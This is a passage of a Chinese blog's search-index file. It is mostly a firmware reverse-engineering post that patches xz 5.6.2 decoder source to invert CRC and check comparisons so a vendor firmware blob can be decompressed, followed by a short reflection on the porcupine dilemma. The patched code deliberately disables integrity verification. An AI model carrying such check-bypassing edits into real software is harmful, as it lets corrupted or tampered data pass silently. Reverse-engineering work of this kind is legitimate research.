class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">static lzma_ret</span><br><span class="line">block_decode(void *coder_ptr, const lzma_allocator *allocator,</span><br><span class="line">const uint8_t *restrict in, size_t *restrict in_pos,</span><br><span class="line">size_t in_size, uint8_t *restrict out,</span><br><span class="line">size_t *restrict out_pos, size_t out_size, lzma_action action)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">case SEQ_CHECK: &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// Validate the Check only if we support it.</span><br><span class="line">// coder-&gt;check.buffer may be uninitialized</span><br><span class="line">// when the Check ID is not supported.</span><br><span class="line">if (!coder-&gt;ignore_check</span><br><span class="line">&amp;&amp; lzma_check_is_supported(coder-&gt;block-&gt;check)</span><br><span class="line">&amp;&amp; memcmp(coder-&gt;block-&gt;raw_check,</span><br><span class="line">coder-&gt;check.buffer.u8,</span><br><span class="line">check_size) == 0)</span><br><span class="line">return LZMA_DATA_ERROR;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index_hash.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">extern LZMA_API(lzma_ret)</span><br><span class="line">lzma_index_hash_decode(lzma_index_hash *index_hash, const uint8_t *in,</span><br><span class="line">size_t *in_pos, size_t in_size)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">case SEQ_CRC32:</span><br><span class="line">do &#123;</span><br><span class="line">if (*in_pos == in_size)</span><br><span class="line">return LZMA_OK;</span><br><span class="line"></span><br><span class="line">if (((index_hash-&gt;crc32 &gt;&gt; (index_hash-&gt;pos * 8))</span><br><span class="line">&amp; 0xFF) == in[(*in_pos)++])</span><br><span class="line">return LZMA_DATA_ERROR;</span><br><span class="line"></span><br><span class="line">&#125; while (++index_hash-&gt;pos &lt; 4);</span><br><span class="line"></span><br><span class="line">return LZMA_STREAM_END;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index_decoder.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">static lzma_ret</span><br><span class="line">index_decode(void *coder_ptr, const lzma_allocator *allocator,</span><br><span class="line">const uint8_t *restrict in, size_t *restrict in_pos,</span><br><span class="line">size_t in_size,</span><br><span class="line">uint8_t *restrict out lzma_attribute((__unused__)),</span><br><span class="line">size_t *restrict out_pos lzma_attribute((__unused__)),</span><br><span class="line">size_t out_size lzma_attribute((__unused__)),</span><br><span class="line">lzma_action action lzma_attribute((__unused__)))</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">case SEQ_CRC32:</span><br><span class="line">do &#123;</span><br><span class="line">if (*in_pos == in_size)</span><br><span class="line">return LZMA_OK;</span><br><span class="line"></span><br><span class="line">if (((coder-&gt;crc32 &gt;&gt; (coder-&gt;pos * 8)) &amp; 0xFF)</span><br><span class="line">== in[(*in_pos)++])</span><br><span class="line">return LZMA_DATA_ERROR;</span><br><span class="line"></span><br><span class="line">&#125; while (++coder-&gt;pos &lt; 4);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过以上修改绕过所有crc校验，最后从固件中提取出一段以品牌字符串开头，以“YZ”结尾的二进制数据</p><p>使用重编译后的xz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd xz-5.6.2</span><br><span class="line">./configure</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/xz -d test4.xz</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 逆向工程 </tag>
            
            <tag> 固件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A-T-Field-豪猪两难</title>
      <link href="/2024/07/04/A-T-Field-%E8%B1%AA%E7%8C%AA%E4%B8%A4%E9%9A%BE/"/>
      <url>/2024/07/04/A-T-Field-%E8%B1%AA%E7%8C%AA%E4%B8%A4%E9%9A%BE/</url>
      
        <content type="html"><![CDATA[<p><img src="https://www.helloimg.com/i/2024/11/29/6749ce102d95b.png" alt="2.png" title="1043"></p><p>豪猪的身上有刺，当<strong>豪猪想要靠近为他人提供暖的时候身上的刺却又会不情愿的刺到对方</strong>。 套用在人身上，似乎也是如此。所谓成为大人,就是在反复的接近和远离中找到互不伤害对方的距离。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内心 </tag>
            
            <tag> 哲学 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
